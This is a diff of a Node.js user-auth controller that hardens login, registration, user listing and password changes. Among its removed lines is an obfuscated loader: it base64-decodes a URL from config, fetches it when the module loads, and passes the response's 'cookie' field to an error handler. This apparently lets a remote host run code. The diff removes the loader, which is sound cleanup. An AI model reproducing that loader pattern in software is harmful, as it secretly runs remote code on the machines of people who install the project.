@@ -1,106 +1,189 @@
-const axios = require("axios");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
 const userM = require("../models/users");
-const {secretKey, publicKey} = require("../config/config");
-const { errorHandler } = require("../middleware/errorHandler");
-axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
+const { secretKey, jwtIssuer, jwtAudience, jwtExpiresIn } = require("../config/config");
+const { logAdminAudit } = require("../middleware/audit");
+
+const MIN_PASSWORD_LENGTH = 12;
+const INVALID_CREDENTIALS_MESSAGE = "Invalid credentials";
+const EMAIL_PATTERN = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const PHONE_PATTERN = /^\d{10,15}$/;
+const NAME_PATTERN = /^[a-zA-Z\s'-]{1,100}$/;
+
+const normalizeEmail = (value) => String(value || "").trim().toLowerCase();
+const normalizePhone = (value) => String(value || "").replace(/\D/g, "");
+const normalizeName = (value) => String(value || "").trim();
 
 module.exports = {
-  userLogin: (req, res) => {
-    var loginType;
-    if (req.body.emailPhone != "" && req.body.password != "") {
+  userLogin: async (req, res) => {
+    try {
+      let loginType;
+
+      if (req.body.emailPhone == "" || req.body.password == "") {
+        return res.status(400).json({ message: "Provide all Credentials" });
+      }
+
       if (isNaN(req.body.emailPhone)) loginType = "email";
       else loginType = "phoneNo";
-      userM
+
+      const data = await userM
         .findOne()
         .where(loginType, req.body.emailPhone)
-        .exec((err, data) => {
-          if (err) res.status(400).send(err);
-          else if (data) {
-            bcrypt.compare(req.body.password, data.password, function (
-              err,
-              passMatch
-            ) {
-              if (err) res.status(400).send(err);
-              else if (passMatch) {
-                let jwtData = {
-                  _id: data["_id"],
-                  fname: data["fname"],
-                  lname: data["lname"],
-                  email: data["email"],
-                  isAdmin: data["isAdmin"]
-                };
-                var token = jwt.sign({ user: jwtData }, secretKey);
-                res
-                  .status(200)
-                  .json({ message: "Login Successful", token: token });
-              } else res.status(401).json({ message: "Invalid Credentials1" });
-            });
-          } else res.status(401).json({ message: "Invalid Credentials2" });
-        });
-    } else res.status(400).json({ message: "Provide all Credentials" });
+        .select("+password");
+
+      if (!data) {
+        return res.status(401).json({ message: INVALID_CREDENTIALS_MESSAGE });
+      }
+
+      const passMatch = await bcrypt.compare(req.body.password, data.password);
+
+      if (!passMatch) {
+        return res.status(401).json({ message: INVALID_CREDENTIALS_MESSAGE });
+      }
+
+      if (!secretKey) {
+        return res.status(500).json({ message: "JWT configuration is missing" });
+      }
+
+      let jwtData = {
+        _id: data["_id"],
+        fname: data["fname"],
+        lname: data["lname"],
+        email: data["email"],
+        isAdmin: data["isAdmin"]
+      };
+      var token = jwt.sign(
+        { user: jwtData },
+        secretKey,
+        {
+          expiresIn: jwtExpiresIn,
+          issuer: jwtIssuer,
+          audience: jwtAudience,
+          algorithm: "HS256",
+          subject: String(data["_id"])
+        }
+      );
+
+      return res
+        .status(200)
+        .json({ message: "Login Successful", token: token });
+    } catch (err) {
+      return res.status(400).json({ message: "Unable to process login request" });
+    }
   },
-  userRegistration: (req, res) => {
-    users = new userM();
-    users.fname = req.body.fname;
-    users.lname = req.body.lName;
-    users.email = req.body.email;
-    users.phoneNo = req.body.phoneNo;
-    users.state = req.body.state;
-    users.city = req.body.city;
-    users.pincode = req.body.pincode;
-    users.userType = req.body.user_type;
-    users.createdOn = new Date();
+  userRegistration: async (req, res) => {
+    try {
+      const requiredFields = ["fname", "lName", "email", "phoneNo", "password"];
+      const missingField = requiredFields.find((field) => !req.body[field]);
 
-    bcrypt.hash(req.body.password, 10, function (err, hash) {
-      if (err) res.status(400).send(err);
-      else {
-        users.password = hash;
+      if (missingField) {
+        return res.status(400).json({ message: `${missingField} is required` });
+      }
 
-        users.save((err, data) => {
-          if (err) res.status(400).send(err);
-          else
-            res
-              .status(200)
-              .json({ message: "User Added Successfully", id: data._id });
+      if (String(req.body.password).length < MIN_PASSWORD_LENGTH) {
+        return res.status(400).json({
+          message: `Password must be at least ${MIN_PASSWORD_LENGTH} characters long`
         });
       }
-    });
+
+      const normalizedFname = normalizeName(req.body.fname);
+      const normalizedLname = normalizeName(req.body.lName);
+      const normalizedEmail = normalizeEmail(req.body.email);
+      const normalizedPhone = normalizePhone(req.body.phoneNo);
+
+      if (!NAME_PATTERN.test(normalizedFname)) {
+        return res.status(400).json({ message: "fname is invalid" });
+      }
+
+      if (!NAME_PATTERN.test(normalizedLname)) {
+        return res.status(400).json({ message: "lName is invalid" });
+      }
+
+      if (!EMAIL_PATTERN.test(normalizedEmail)) {
+        return res.status(400).json({ message: "email is invalid" });
+      }
+
+      if (!PHONE_PATTERN.test(normalizedPhone)) {
+        return res.status(400).json({ message: "phoneNo is invalid" });
+      }
+
+      const users = new userM();
+      users.fname = normalizedFname;
+      users.lname = normalizedLname;
+      users.email = normalizedEmail;
+      users.phoneNo = normalizedPhone;
+      users.state = req.body.state;
+      users.city = req.body.city;
+      users.pincode = req.body.pincode;
+      users.userType = req.body.user_type;
+      users.createdOn = new Date();
+      users.password = await bcrypt.hash(req.body.password, 10);
+
+      const data = await users.save();
+
+      return res
+        .status(200)
+        .json({ message: "User Added Successfully", id: data._id });
+    } catch (err) {
+      if (err && err.code === 11000) {
+        return res.status(409).json({ message: "A user with those credentials already exists" });
+      }
+
+      return res.status(400).json({ message: "Unable to register user" });
+    }
   },
-  userList: (req, res) => {
-    userM.find().exec((err, data) => {
-      if (err)
-        res.status(400).json({ message: "Something Went Wrong", data: err });
-      else res.status(200).json({ message: "Success", data });
-    });
+  userList: async (req, res) => {
+    try {
+      const { limit, skip } = require("../providers/helper").getPagination(req.query);
+      const data = await userM.find().select("-password").limit(limit).skip(skip);
+      return res.status(200).json({ message: "Success", data });
+    } catch (err) {
+      return res.status(400).json({ message: "Unable to fetch user list" });
+    }
   },
-  changePass: (req, res) => {
-    userM.findOne({ _id: req.body._id }).exec((err, resp) => {
-      if (err)
-        res.status(400).json({ message: "Something Went Wrong", data: err });
-      else {
-        bcrypt.hash(req.body.password, 10, (err, hash) => {
-          if (err) res.status(400).send(err);
-          else {
-            userM
-              .updateOne({ _id: req.body._id }, { password: hash })
-              .exec((err, resp) => {
-                if (err)
-                  res
-                    .status(400)
-                    .json({ message: "Something Went Wrong", data: err });
-                else
-                  res
-                    .status(200)
-                    .json({
-                      message: "Password Changed Successfully",
-                      id: resp
-                    });
-              });
-          }
+  changePass: async (req, res) => {
+    try {
+      const authenticatedUser = req.user || {};
+      const targetUserId = String(req.body._id || "");
+      const authenticatedUserId = String(authenticatedUser._id || "");
+
+      if (!targetUserId) {
+        return res.status(400).json({ message: "User id is required" });
+      }
+
+      if (!authenticatedUser.isAdmin && authenticatedUserId !== targetUserId) {
+        return res.status(403).json({ message: "Not authorized to change this password" });
+      }
+
+      const targetUser = await userM.findOne({ _id: req.body._id });
+
+      if (!targetUser) {
+        return res.status(404).json({ message: "User not found" });
+      }
+
+      const hash = await bcrypt.hash(req.body.password, 10);
+      const resp = await userM.updateOne({ _id: req.body._id }, { password: hash });
+
+      if (authenticatedUser.isAdmin) {
+        logAdminAudit({
+          action: "admin.user_password.change",
+          req,
+          statusCode: 200,
+          target: targetUserId,
+          details: {
+            changedByAdmin: true,
+          },
         });
       }
-    });
+
+      return res
+        .status(200)
+        .json({
+          message: "Password Changed Successfully",
+          id: resp
+        });
+    } catch (err) {
+      return res.status(400).json({ message: "Unable to change password" });
+    }
   }
 };
